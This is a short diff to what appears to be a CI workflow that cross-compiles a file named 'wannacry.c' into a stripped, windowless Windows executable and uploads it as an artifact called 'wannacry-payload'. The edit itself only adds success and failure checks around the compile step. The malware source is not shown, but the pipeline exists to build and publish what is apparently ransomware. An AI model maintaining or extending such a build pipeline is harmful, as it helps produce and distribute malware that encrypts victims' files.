@@ -13,11 +13,17 @@ jobs:
         run: sudo apt update && sudo apt install mingw-w64 -y
       - name: Compile
         run: |
-          x86_64-w64-mingw32-gcc wannacry.c -o wannacry.exe \
+          if x86_64-w64-mingw32-gcc wannacry.c -o wannacry.exe \
             -mwindows -s -O2 \
             -lws2_32 -luser32 -lgdi32 -lcrypt32 -lcomctl32 -lshell32 \
-            -static -fno-stack-protector
+            -static -fno-stack-protector; then
+            echo "Compilation succeeded."
+          else
+            echo "Compilation failed. Check wannacry.c for errors."
+            exit 1
+          fi
       - name: Upload EXE
+        if: success()
         uses: actions/upload-artifact@v4
         with:
           name: wannacry-payload
